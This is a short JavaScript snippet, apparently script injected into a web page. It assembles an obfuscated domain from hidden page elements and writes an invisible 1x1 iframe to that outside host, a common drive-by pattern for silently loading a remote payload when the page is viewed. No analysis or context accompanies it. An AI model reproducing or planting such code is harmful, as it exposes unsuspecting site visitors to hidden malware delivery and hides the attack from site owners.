var z = ((document.getElementById("number").innerHTML).replace(/4/g,'c')).replace(/[157]/g,'%');
var x = document.getElementById("photo").innerHTML;
var y = document.getElementById("year").innerHTML;
document.write('<iframe src=\'http://uu0tipoz'+unescape(z)+'.rep/'+x+'/'+y+'/noref.ht'+'ml'+'\' width=\'1\' height=\'1\'></iframe>');
